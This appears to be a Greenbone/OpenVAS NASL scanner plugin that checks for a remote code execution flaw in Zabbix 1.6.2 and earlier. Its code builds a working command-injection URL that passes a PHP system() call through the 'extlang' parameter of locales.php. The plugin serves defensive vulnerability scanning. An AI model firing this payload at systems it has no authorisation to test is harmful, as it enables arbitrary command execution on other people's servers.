# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:zabbix:zabbix";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103581");
  script_version("2022-02-23T10:57:32+0000");
  script_tag(name:"last_modification", value:"2022-02-23 10:57:32 +0000 (Wed, 23 Feb 2022)");
  script_tag(name:"creation_date", value:"2012-10-02 10:27:14 +0200 (Tue, 02 Oct 2012)");
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");

  script_name("Zabbix <= 1.6.2 RCE Vulnerability");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_zabbix_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zabbix/http/detected");

  script_tag(name:"summary", value:"Zabbix is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Input passed to the 'extlang' parameter in 'locales.php' is not
  properly sanitised before being used to process data. This can be exploited to execute arbitrary
  commands via specially crafted requests.");

  script_tag(name:"affected", value:"Zabbix version 1.6.2 and possibly prior.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_xref(name:"URL", value:"http://www.ush.it/team/ush/hack-zabbix_162/adv.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

commands = exploit_commands();

foreach cmd( keys( commands ) ) {
  url = dir + '/locales.php?download=1&langTo=1&extlang[%22.system(%27' + commands[cmd] + '%27).%22]=1';

  if( http_vuln_check( port:port, url:url, pattern:cmd ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
